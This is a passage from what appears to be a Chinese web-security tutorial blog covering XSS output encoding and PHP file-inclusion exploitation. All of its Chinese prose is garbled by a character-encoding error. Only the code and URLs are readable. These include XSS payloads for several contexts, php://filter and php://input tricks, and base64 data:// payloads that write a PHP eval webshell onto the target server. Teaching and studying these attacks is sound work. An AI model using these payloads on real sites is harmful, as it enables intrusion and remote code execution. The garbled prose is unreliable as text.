<p>åœ¨PHPä¸­ï¼Œæœ‰<code>htmlentities()</code>å’Œ<code>htmlspecialchars()</code>ä¸¤ä¸ªå‡½æ•°å¯ä»¥æ»¡è¶³å®‰å…¨è¦æ±‚ã€‚</p>
<h3 id="JavaScriptEncode">JavaScriptEncode</h3>
<p>JavaScriptEncodeéœ€è¦ä½¿ç”¨<code>\</code>å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œè€Œä¸”åœ¨å¯¹æŠ—XSSæ¼æ´æ—¶ï¼Œè¿˜è¦æ±‚è¾“å‡ºçš„å˜é‡å¿…é¡»åœ¨å¼•å·å†…éƒ¨ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = escapeJavaScript($evil);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">&#x27;&quot;&#x27;</span>+escapeJavaScript($evil)+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¦‚æœè¾“å…¥çš„æ˜¯<code>1; alert(2)</code>ï¼Œåˆ™ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>; alert(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> y = <span class="string">&quot;1; alert(2)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€è¡Œæ‰§è¡Œäº†é¢å¤–çš„ä»£ç ï¼Œç¬¬äºŒè¡Œåˆ™æ˜¯å®‰å…¨çš„ã€‚</p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨æ›´åŠ ä¸¥æ ¼çš„JavaScriptEncodeå‡½æ•°æ¥ä¿è¯å®‰å…¨â€”â€”é™¤äº†æ•°å­—å’Œå­—æ¯å¤–çš„æ‰€æœ‰å­—ç¬¦ï¼Œéƒ½ä½¿ç”¨åå…­è¿›åˆ¶<code>\xHH</code>çš„æ–¹å¼è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>\x3balert\x282\x29;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="å…·ä½“å®ä¾‹">å…·ä½“å®ä¾‹</h3>
<h4 id="åœ¨HTMLæ ‡ç­¾ä¸­è¾“å‡º">åœ¨HTMLæ ‡ç­¾ä¸­è¾“å‡º</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span>$var<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯æ„é€ ä¸€ä¸ª<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œpayloadï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(xss)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>é˜²å¾¡æ–¹å¼æ˜¯å¯¹å˜é‡ä½¿ç”¨HtmlEncodeã€‚</strong></p>
<h4 id="åœ¨HTMLå±æ€§ä¸­è¾“å‡º">åœ¨HTMLå±æ€§ä¸­è¾“å‡º</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;$var&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;abc&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>é˜²å¾¡æ–¹å¼ä¹Ÿæ˜¯é‡‡ç”¨HtmlEncodeã€‚</strong></p>
<h4 id="åœ¨-script-æ ‡ç­¾ä¸­è¾“å‡º">åœ¨&lt;script&gt;æ ‡ç­¾ä¸­è¾“å‡º</h4>
<p>åœ¨&lt;script&gt;æ ‡ç­¾ä¸­è¾“å‡ºï¼Œé¦–å…ˆåº”è¯¥ç¡®ä¿è¾“å‡ºçš„å˜é‡åœ¨å¼•å·ä¸­ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ”»å‡»è€…é¦–å…ˆè¦å…ˆé—­åˆå¼•å·æ‰èƒ½å®æ–½XSSæ”»å‡»ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> x = <span class="string">&quot;&quot;</span>;alert(<span class="regexp">/xss/</span>);<span class="comment">//&quot;;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>é˜²å¾¡æ—¶ä½¿ç”¨JavaScriptEncodeã€‚</strong></p>
<h4 id="åœ¨äº‹ä»¶ä¸­è¾“å‡º">åœ¨äº‹ä»¶ä¸­è¾“å‡º</h4>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;$var&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payloadï¼š<code>var = '); alert(/xss/);//</code></p>
<p>å³ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">onclick</span>=<span class="string">&quot;funcA(&#x27;&#x27;); alert(/xss/);//&#x27;)&quot;</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>é˜²å¾¡æ—¶ä½¿ç”¨JavaScriptEncodeç¼–ç ã€‚</strong></p>
<h4 id="åœ¨CSSä¸­è¾“å‡º">åœ¨CSSä¸­è¾“å‡º</h4>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œå°½å¯èƒ½ç¦æ­¢ç”¨æˆ·å¯æ§åˆ¶çš„å˜é‡åœ¨â€&lt;style&gt;æ ‡ç­¾â€œã€â€HTMLæ ‡ç­¾çš„styleå±æ€§â€œä»¥åŠâ€CSSæ–‡ä»¶â€œä¸­è¾“å‡ºã€‚</p>
<h4 id="åœ¨åœ°å€ä¸­è¾“å‡º">åœ¨åœ°å€ä¸­è¾“å‡º</h4>
<p>ä¸€ä¸ªURLç»„æˆå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Protocal][Host][Path][Search][Hash]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.evil.com&#x2F;a&#x2F;b&#x2F;c&#x2F;?abc&#x3D;123#ssss</span><br><span class="line">[Protocal] &#x3D; &quot;https:&#x2F;&#x2F;&quot;</span><br><span class="line">[Host] &#x3D; &quot;www.evil.com&quot;</span><br><span class="line">[Path] &#x3D; &quot;&#x2F;a&#x2F;b&#x2F;c&#x2F;&quot;</span><br><span class="line">[Search] &#x3D; &quot;?abc&#x3D;123&quot;</span><br><span class="line">[Hash] &#x3D; &quot;#ssss&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨URLçš„pathï¼ˆè·¯å¾„ï¼‰æˆ–è€…searchï¼ˆå‚æ•°ï¼‰ä¸­è¾“å‡ºï¼Œä½¿ç”¨URLEncodeå³å¯ã€‚URLEncodeä¼šå°†å­—ç¬¦è½¬æ¢ä¸ºâ€%HHâ€œå½¢å¼ã€‚</p>
<p>ä½†åœ¨Protocalå’ŒHostä¸­ä¸èƒ½ä½¿ç”¨ä¸¥æ ¼çš„URLEncodeç¼–ç ï¼Œå› ä¸ºä¼šæŠŠ<code>://</code>ã€<code>.</code>ç­‰éƒ½ç¼–ç æ‰ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;$var&quot;</span> &gt;</span>Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä¼ªåè®®å®æ–½æ”»å‡»ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1);&quot;</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯¹äºMozillaæ”¯æŒçš„<code>dataURI</code>ä¼ªåè®®ï¼Œå®ƒèƒ½å¤Ÿå°†ä¸€æ®µä»£ç å†™åœ¨URIä¸­ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;dataURI:test/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¿™æ®µä»£ä¹°çš„æ„æ€æ—¶ï¼Œä»¥test/htmlçš„æ ¼å¼åŠ è½½ç¼–ç ä¸ºbase64çš„æ•°æ®ã€‚åŠ è½½å®Œæˆåå®é™…ä¸Šæ—¶ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¯¹äºè¿™ç§æ‰‹æ®µçš„æ”»å‡»ï¼Œé¦–å…ˆåº”è¯¥æ£€æŸ¥å˜é‡æ˜¯å¦æ˜¯ä»¥<code>http</code>å¼€å¤´ï¼Œå¦‚æœä¸æ˜¯åˆ™è‡ªåŠ¨åŠ ä¸Šï¼Œå†å¯¹å˜é‡è¿›è¡ŒURLEncodeï¼Œå³å¯ä¿è¯æ²¡æœ‰æ­¤ç±»çš„XSSæ”»å‡»ã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</title>
    <url>/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨">Webå®‰å…¨å­¦ä¹ ä¹‹æ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨</h1>
<p>è¿™ä¸€ç¯‡ä¸»è¦æ¥èŠä¸€èŠPHPçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¸»è¦åŒ…æ‹¬<strong>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLocal File Inclusionï¼ŒLFIï¼‰</strong>ã€<strong>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆRemote File Inclusionï¼Œ RFIï¼‰<strong>å’Œ</strong>PHPä¼ªåè®®çš„åˆ©ç”¨</strong>ã€‚</p>
<h2 id="æ–‡ä»¶åŒ…å«çš„åŸºæœ¬æ¦‚å¿µ">æ–‡ä»¶åŒ…å«çš„åŸºæœ¬æ¦‚å¿µ</h2>
<p>ä¸¥æ ¼æ¥è¯´ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´æ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ï¼Œå…¶åŸç†å°±æ˜¯æ³¨å…¥ä¸€æ®µç”¨æˆ·èƒ½æ§åˆ¶çš„è„šæœ¬æˆ–ä»£ç ï¼Œä½¿æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚è‡³äºæ–‡ä»¶åŒ…å«ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§â€œå¤–éƒ¨æ•°æ®æµåŒ…å«â€ï¼Œè¿™ä¸ªå¤–éƒ¨æ•°æ®æµå¯ä»¥æ˜¯æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯POSTæ•°æ®æµçš„å½¢å¼ã€‚</p>
<p>å¯¹äºPHPå…·ä½“è€Œè¨€ï¼Œæœ‰ï¼”ä¸ªå¯åˆ©ç”¨çš„å‡½æ•°ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br></pre></td></tr></table></figure>
<p>å½“ä½¿ç”¨è¿™4ä¸ªå‡½æ•°åŒ…å«ä¸€ä¸ªæ–°æ–‡ä»¶æ—¶è¯¥æ–‡ä»¶å°†ä½œä¸ºPHPä»£ç æ‰§è¡Œï¼ŒPHPå†…æ ¸å¹¶ä¸ä¼šåˆ¤æ–­è¯¥è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯ä»€ä¹ˆç±»å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¢«åŒ…å«çš„txtæ–‡ä»¶ã€å›¾ç‰‡æ–‡ä»¶ã€è¿œç¨‹URLéƒ½ä¼šä½œä¸ºPHPä»£ç è¢«æ‰§è¡Œã€‚</p>
<p>ä¸¾ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­æ¥çœ‹çœ‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[test]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>fortest.txtæ–‡ä»¶å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for test</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>é¡µé¢ç»“æœï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191114140517.png" alt=""></p>
<p>è¦æƒ³æˆåŠŸåˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œéœ€è¦æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¡ä»¶ï¼š</p>
<ol>
<li>include()ç­‰å‡½æ•°é€šè¿‡åŠ¨æ€å˜é‡çš„æ–¹å¼å¼•å…¥éœ€è¦åŒ…å«çš„æ–‡ä»¶ï¼›</li>
<li>ç”¨æˆ·èƒ½æ§åˆ¶è¯¥åŠ¨æ€å˜é‡ã€‚</li>
</ol>
<h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«">è¿œç¨‹æ–‡ä»¶åŒ…å«</h2>
<p>å¦‚æœPHPçš„é…ç½®é€‰é¡¹allow_url_includeä¸ºONçš„è¯ï¼Œåˆ™include/requireå‡½æ•°æ˜¯å¯ä»¥åŠ è½½è¿œç¨‹æ–‡ä»¶çš„ï¼Œè¿™ç§æ¼æ´ç§°ä¸ºè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $basePath = $_GET[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">	<span class="keyword">require_once</span> $basePath . <span class="string">&quot;/action/m_share.php&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ä»£ç çœ‹ä¼¼å°†è·¯å¾„çš„ååŠæ®µå·²ç»è§„å®šäº†ï¼Œä½†åˆ©ç”¨HTTPå‚æ•°è¿˜æ˜¯æœ‰åŠæ³•ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;FileInclude&#x2F;index.php?path&#x3D;http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;solution.php?</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥å®é™…çš„æ‰§è¡Œä»£ç å°±æ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;http://localhost/FileInclude/index.php?path=http://localhost/test/solution.php?/action/m_share.php&quot;</span></span><br></pre></td></tr></table></figure>
<p>å³ï¼Œé—®å·&quot;?&quot;åé¢çš„ä»£ç è¢«è§£é‡ŠæˆURLçš„querystringï¼Œè¿™ä¹Ÿæ˜¯ä¸€ç§&quot;æˆªæ–­&quot;æ€æƒ³ï¼Œå’Œ%00ä¸€æ ·ã€‚</p>
<p>é˜²å¾¡æ–¹æ³•ï¼šå…³é—­è¿œç¨‹æ–‡ä»¶åŒ…å«çš„é…ç½®é”™è¯¯ï¼Œå³<code>allow_url_include = Off</code></p>
<h2 id="æœ¬åœ°æ–‡ä»¶åŒ…å«">æœ¬åœ°æ–‡ä»¶åŒ…å«</h2>
<p>èƒ½è¿‡æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œè¢«ç§°ä¸ºæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œåˆ©ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«æˆ‘ä»¬å¯ä»¥æ‰§è¡Œæ”»å‡»è€…çš„ä»»æ„ä»£ç ï¼Œè€Œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´åªèƒ½æŸ¥çœ‹æˆ–è¿è¡Œæœ¬åœ°æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PHPçš„ä¼ªåè®®ç­‰æ–¹å¼æ¥åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ¥ä¸‹æ¥è®²çš„æ˜¯å¦‚ä¸‹å‡ ç§åˆ©ç”¨æ–¹å¼ï¼š</p>
<ul>
<li>PHPä¼ªåè®®ï¼ˆè¾ƒä¸ºé€šç”¨ï¼‰</li>
<li>åŒ…å«Sessionæ–‡ä»¶</li>
<li>åŒ…å«æ—¥å¿—ï¼ˆè¾ƒä¸ºé€šç”¨ï¼‰</li>
<li>åŒ…å«environæ–‡ä»¶</li>
<li>åŒ…å«ä¸´æ—¶æ–‡ä»¶</li>
<li>åŒ…å«ä¸Šä¼ æ–‡ä»¶</li>
</ul>
<h3 id="PHPä¼ªåè®®">PHPä¼ªåè®®</h3>
<h4 id="php-åè®®">php://åè®®</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input</span><br><span class="line">php:&#x2F;&#x2F;filter</span><br></pre></td></tr></table></figure>
<p>php://inputç”¨äºæ‰§è¡ŒPHPä»£ç ï¼Œphp://filterç”¨äºè¯»å–æºç ã€‚</p>
<h5 id="php-filter">php://filter</h5>
<p>php://filteræ˜¯ä¸€ç§å…ƒå°è£…å™¨ï¼Œè®¾è®¡ç”¨äº&quot;æ•°æ®æµæ‰“å¼€&quot;æ—¶çš„&quot;ç­›é€‰è¿‡æ»¤&quot;åº”ç”¨ï¼Œå¯¹æœ¬åœ°ç£ç›˜æ–‡ä»¶è¿›è¡Œè¯»å†™ã€‚ç®€å•æ¥è®²å°±æ˜¯å¯ä»¥åœ¨æ‰§è¡Œä»£ç å‰å°†ä»£ç æ¢ä¸ªæ–¹å¼è¯»å–å‡ºæ¥ï¼Œåªæ˜¯è¯»å–ï¼Œä¸éœ€è¦å¼€å¯allow_url_includeã€‚</p>
<p><strong>ç”¨æ³•ï¼š<code>?file=php://filter/convert.base64-encode/resource=xxx.php</code></strong></p>
<p>å‡è®¾é¡µé¢çš„æºä»£ç <code>index.php</code>ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;</span>;&#125;</span><br><span class="line">	$file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">include</span>($file); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url: http:&#x2F;&#x2F;localhost&#x2F;test&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br><span class="line">result: PD9waHAgc3lzdGVtKCdpcGNvbmZpZycpOz8+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>base64è§£å¯†å°±å¯ä»¥çœ‹åˆ°å†…å®¹ï¼Œè¿™é‡Œå¦‚æœä¸è¿›è¡Œbase64_encodeï¼Œåˆ™è¢«includeè¿›æ¥çš„ä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´çœ‹ä¸åˆ°æºä»£ç ã€‚</p>
</blockquote>
<h5 id="php-input">php://input</h5>
<p>php://inputåè®®ä¸»è¦ç”¨äºè®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµã€‚CTFä¸­ç»å¸¸ä½¿ç”¨<code>file_get_contents</code>è·å–php://inputå†…å®¹(POST)ï¼Œéœ€è¦å¼€å¯allow_url_includeï¼Œå¹¶ä¸”å½“<code>enctype=&quot;multipart/form-data&quot;</code>çš„æ—¶å€™ php://inputæ˜¯æ— æ•ˆçš„ã€‚</p>
<p><strong>åˆ©ç”¨æ–¹å¼ï¼š<code>?file=php://input æ•°æ®åˆ©ç”¨POSTä¼ è¿‡å»</code></strong></p>
<blockquote>
<p>ç¢°åˆ°file_get_contents()å°±è¦æƒ³åˆ°ç”¨php://inputç»•è¿‡ï¼Œå› ä¸ºphpä¼ªåè®®ä¹Ÿæ˜¯å¯ä»¥åˆ©ç”¨httpåè®®çš„ï¼Œå³å¯ä»¥ä½¿ç”¨POSTæ–¹å¼ä¼ æ•°æ®ã€‚</p>
</blockquote>
<p>å‡è®¾é¡µé¢æºä»£ç ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (@file_get_content($file) == <span class="string">&#x27;meizijiu&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ç›´æ¥ä½¿ç”¨Hackbarå·¥å…·POSTæ•°æ®ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191114222620.png" alt=""></p>
<p>å¦å¤–è¿˜å¯ä»¥å†™å…¥ä¸€å¥è¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">postæ•°æ®:</span><br><span class="line">&lt;?php </span><br><span class="line">echo file_put_contents(&quot;test.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NjJ10pPz4&#x3D;&quot;));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="data-åè®®">data://åè®®</h4>
<blockquote>
<p>php.iniï¼šallow_url_include=Onã€allow_url_fopen()éƒ½ä¸ºOn</p>
</blockquote>
<p>åˆ©ç”¨data://ä¼ªåè®®è¿›è¡Œä»£ç æ‰§è¡Œçš„æ€è·¯åŸç†å’Œphp://æ˜¯ç±»ä¼¼çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨äº†PHPä¸­çš„æµçš„æ¦‚å¿µï¼Œå°†åŸæœ¬çš„includeçš„æ–‡ä»¶æµé‡å®šå‘åˆ°äº†ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æµä¸­ã€‚</p>
<p>é¡µé¢ç¤ºä¾‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;for test&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;www.inc.com&#x2F;inc.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZWNobyBmaWxlX3B1dF9jb250ZW50cygidGVzdC5waHAiLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnWlhaaGJDZ2tYMUJQVTFSYkoyTmpKMTBwUHo0PSIpKTs&#x2F;Pg&#x3D;&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æœ€åä¸€ä¸ªURLä½¿ç”¨<code>file_put_contents()</code>å‡½æ•°å°†<code>&lt;?php eval($_POST['cc'])?&gt;</code>å†™åˆ°äº†<code>test.php</code>æ–‡ä»¶å½“ä¸­ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191115093051.png" alt=""></p>
<h4 id="phar-åè®®">phar://åè®®</h4>
<blockquote>
<p>phpç‰ˆæœ¬ â‰¥ 5.3</p>
